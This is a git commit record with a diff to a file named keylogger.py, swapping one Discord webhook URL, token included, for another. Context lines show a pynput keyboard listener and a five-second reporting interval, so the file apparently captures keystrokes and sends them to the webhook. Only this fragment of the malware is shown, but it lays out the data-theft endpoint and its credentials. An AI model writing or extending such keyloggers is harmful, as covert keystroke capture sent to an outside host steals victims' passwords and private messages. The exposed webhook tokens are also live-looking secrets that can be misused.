d34e8cc7d8d320c1d36265524a1044db8466f7b4
xborz75 <103429301+xborz75@users.noreply.github.com>
2024-06-13 09:22:28 +0200

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -3,7 +3,7 @@ from threading import Timer
 from pynput.keyboard import Listener
 
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1238098767660584992/wpaiZxxAZewim8DZ9JD0_PKlxnRPiG8U-hWXxsZFRIope_3iys--sAiLOB-LhQYqu-48'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1250711181698531358/BV75GPYy3gfJcBvWkH65cuAeCNZ0QV0Z6iFVeKV2PHHd_ph7UE41qyCyX8r4YiFHR_OT'
 TIME_INTERVAL = 5  # Amount of time between each report, expressed in seconds.
 
 
